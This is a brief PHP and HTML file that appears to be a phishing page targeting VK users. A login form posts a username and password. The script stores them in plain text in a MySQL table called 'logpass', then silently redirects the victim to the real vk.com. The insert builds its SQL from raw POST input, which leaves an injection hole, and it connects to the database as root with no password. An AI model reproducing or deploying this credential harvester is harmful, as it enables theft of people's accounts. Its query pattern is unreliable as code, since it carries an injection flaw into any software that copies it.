<?php
    $link = mysqli_connect("localhost", "root", "", "log_pass");
/*
    if (!$link) {
        echo "Ошибка: Невозможно установить соединение с MySQL." . PHP_EOL;
        echo "Код ошибки errno: " . mysqli_connect_errno() . PHP_EOL;
        echo "Текст ошибки error: " . mysqli_connect_error() . PHP_EOL;
        exit;
    }

    echo "Соединение с MySQL установлено!" . PHP_EOL;
    echo "Информация о сервере: " . mysqli_get_host_info($link) . PHP_EOL;
*/
    //mysqli_close($link);

    $login = $_POST['login'];
    $pass = $_POST['pass'];

    mysqli_real_query($link, "INSERT INTO logpass (login, pass) VALUES ('$login', '$pass')");
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; URL='https://vk.com'" />
</head>
<body>
<table width=100% height=100%>
    <tr>
        <td align=left>
            <form action="submit.php" method="post" name="reg">
                <input type="text" name="login">
                <input type="text" name="pass">
                <input type="submit" value="Войти">
            </form>

        </td>
    </tr>
</table>
</body>
</html>